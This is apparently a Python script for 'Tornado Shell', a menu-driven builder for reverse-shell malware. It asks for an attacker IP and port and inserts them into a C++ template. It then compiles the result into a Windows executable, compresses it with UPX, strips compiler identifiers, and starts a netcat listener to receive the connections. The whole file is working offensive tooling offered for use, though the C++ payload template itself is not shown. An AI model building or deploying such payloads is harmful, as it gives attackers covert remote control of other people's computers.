import subprocess
from time import sleep
import sys
import termios
import tty
import ipaddress
from os import system
from rich.progress import Progress
from rich.console import Console
import threading
import socket

Black = '\033[1;30m'        # Black
Red = '\033[1;31m'          # Red
Green = '\033[1;32m'        # Green
Yellow = '\033[1;33m'       # Yellow
Blue = '\033[1;34m'         # Blue
Purple = '\033[1;35m'       # Purple
Cyan = '\033[1;36m'         # Cyan
White = '\033[1;37m'        # White
NC = '\033[0m'



def logo():
    print(f'''{Blue}
                      ░░░░░░░░░░░░▄▄██████████▄▄░░░░░░░░░░
                      ░░░░░░░░░░▄███▀▀▀░░░░░▀▀▀██░░░░░░░░░
                      ░░░░░░░░░███▀░░░░░░░░░░░░░██▄░░░░░░░
                      ░░░░░░░░████░░░░░░░░░░░░░░███░░░░░░░
                      ░░░░░░░████░░░░░░░░░░░░░░░▀███░░░░░░
                      ░░░░░░▄████░░░░▄██░░░██░░░░███▄░░░░░
                      ░░░░░░████░░░░▄███░░░███░░░████░░░░░
                      ░░░░░████▀░▄▄███▀░░░░▀███▄▄░███░░░░░
                      ░░░░░████░░▀▀█▀▀░░░▄░░░▀██▀░░██▄░░░░
                      ░░░░░█████░░░░░░░▄███░░░░░░░░███░░░░
                      ░░░░░███████░░░░░░░░░░░░░░░▄████░░░░
                      ░░░░░███████░░░░░▄▄▄▄░░░░░▄█████░░░░
                      ░░░░░███████▄░░░██████░░░░██████░░░░
                      ░░░░░████████▄░░██████░░░▄██████░░░░
                      ░░▄▄██████████▄░██████░░▄███████▄▄░░
                      ███TORNADO████████████░█SHELL█████░▄
                      ████████████████░████░▄█████████████
                      ████████████████░████░██████████████
                      ████████████████▄░▀▀░▄██████████████
                      █████████████████▄░░▄███████████████
                      ████████████████████████████████████

                          {Blue}☠︎︎ Created by K3rnel-Dev ☠︎︎
                    ☠︎︎ Github:https://github.com/K3rnel-dev ☠︎︎{Blue}
        ''')



def main():
    subprocess.call('clear')
    logo()
    print("\n")
    print(f"{Blue}+-------------------------------------------------------+")
    print(f"+          TORNADO SHELL                              \t+")
    print(f"{Blue}+-------------------------------------------------------+{NC}")
    print(f"{Blue}+ [0] Exit                                      \t+")
    print(f"{Blue}+ [1] Build Shell                               \t+")
    print(f"+ [2] Start Listener                                  \t+")
    print(f"{Blue}+-------------------------------------------------------+")
    sleep(0.3)
    print(Blue + "[☠︎︎]admin@tornadoshell#: " + White, end='', flush=True)
    OPERATION = getch()
    while OPERATION not in ['0', '1', '2']:
        print(f"{Red}[-] You entered an invalid option!{NC}")
        print(Blue + "[☠︎︎]admin@tornadoshell#: " + White, end='', flush=True)
        OPERATION = getch()
    else:
        if OPERATION == '0':
            subprocess.call('clear')
            logo()
            sys.exit()

        if OPERATION == '1':
            subprocess.call('clear')
            logo()

            while True:
                user_ip = input('[☠︎︎] Enter ip-address: ')
                try:
                    ipaddress.IPv4Address(user_ip)
                    break
                except ipaddress.AddressValueError:
                    print('[☠︎︎] This is not a valid IPv4 address!')
                    sleep(1.2)
                    subprocess.call('clear')
                    logo()

            user_port = input('[☠︎︎] Enter port: ')
            while not (user_port.isnumeric() and len(user_port) > 0):
                print('[☠︎︎] This is not a correctly port!')
                user_port = input('[☠︎︎] Enter port: ')
            else:
                print(f'[☠︎︎]OK!')
                subprocess.call('clear')
                logo()
                print(f'[☠︎︎]OK!')
                generate_shell_code(user_ip, user_port)

        elif OPERATION == '2':
            subprocess.call('clear')
            logo()
            listen_port = input('[☠︎︎]Enter port to listen: ')
            subprocess.call('clear')
            logo()
            listen_for_connections(listen_port)
            print(f"\n{Green}[☠︎︎]Back to main menu.\n")
            sleep(1)
            main()

def listen_for_connections(port):
    print(f"{Red}Listening for incoming connections on port {port}. . .")
    system(f'nc -lvnp {port}')

def generate_shell_code(ip, port):
    with open('sources/shell.cpp', 'r') as shell_file:
        shell_code = shell_file.read()

    shell_code = shell_code.replace('IPADDRSELECT', ip)
    shell_code = shell_code.replace('PORTSELECT', port)

    with open('sources/shell_tmp.cpp', 'w') as generated_shell_file:
        generated_shell_file.write(shell_code)

    subprocess.call('i686-w64-mingw32-g++ sources/shell_tmp.cpp -o builds/shell.exe -lws2_32 -static-libgcc -fno-ident -static-libstdc++;upx -9 builds/shell.exe;clear', shell=True)
    shell_code = shell_code.replace(ip, 'IPADDRSELECT')
    shell_code = shell_code.replace(port, 'PORTSELECT')
    system('rm sources/shell_tmp.cpp')

    with open('sources/shell.cpp', 'w') as generated_shell_file:
        generated_shell_file.write(shell_code)

    print(f"[+] Shell code generated successfully with path {Green}builds/shell.exe")
    sleep(1)
    main()




def getch():
    fd = sys.stdin.fileno()
    old_settings = termios.tcgetattr(fd)
    try:
        tty.setraw(fd)
        ch = sys.stdin.read(1)
    finally:
        termios.tcsetattr(fd, termios.TCSADRAIN, old_settings)
    return ch


if __name__ == '__main__':
    main()